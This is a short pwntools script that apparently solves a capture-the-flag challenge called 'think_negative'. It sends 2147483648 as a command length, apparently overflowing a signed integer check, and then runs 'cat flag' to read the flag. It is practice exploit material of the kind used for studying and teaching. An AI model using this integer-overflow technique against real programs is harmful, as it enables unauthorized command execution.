from pwn import *

r = process('./think_negative')

r.recvuntil(b'How long is your command: ')
r.sendline(b'2147483648')

r.recvuntil(b'Enter a command: ')
r.sendline(b'cat flag')
r.interactive()